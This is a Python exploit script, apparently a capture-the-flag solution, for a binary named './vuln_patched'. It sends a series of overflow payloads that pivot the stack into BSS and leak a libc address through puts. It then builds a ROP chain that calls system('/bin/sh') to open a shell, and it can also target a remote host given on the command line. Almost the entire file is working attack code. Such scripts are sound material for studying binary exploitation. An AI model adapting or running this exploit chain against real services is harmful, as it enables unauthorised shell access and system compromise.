#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./vuln_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
b *0x401227
c
'''

def start(argv=[]):
    if args.GDB:
        p = process([exe.path] + argv, aslr=False)
        gdb.attach(p, gdbscript=gdbscript)
        pause()
        return p
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv)


# ==================== EXPLOIT ====================
p = start()


offset      = 0x20
bss         = 0x404800

gets_gadget = 0x401205
puts_gadget = 0x401211

leave_ret   = 0x401226
pop_rbp     = 0x401181
pop_rcx     = 0x40117e
add_bl_dh   = 0x4010bf
ret         = pop_rbp + 1

payload = flat({
    offset: [
        bss-0x10,
        gets_gadget
    ]
}, filler=b'A')

input("Payload 1")
sl(payload)

payload = flat({
    offset:[
        0x404038 + 0x20,
        gets_gadget,

        0x404018 + 0x20,
        puts_gadget,

        cyclic(0x10),

        bss + 0x30 + 0x20,
        gets_gadget,

    ]
}, filler=b'B')

input("Payload 2")
sl(payload)

payload = p64(bss + 0x20) + p64(leave_ret)
payload += b'C' * 0x10
payload += p64(bss) + p64(leave_ret)

input("Payload 3")
sl(payload)

rls(3)
libc.address = u64(rl()[:-1].ljust(0x8, b'\0')) - 0x2045c0
success('libc base @ %#x', libc.address)

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

payload = flat({
    offset: [
        0,
        pop_rdi, next(libc.search(b'/bin/sh\0')),
        ret, libc.sym.system
    ]
})

input("Payload 4")
sl(payload)

interactive()
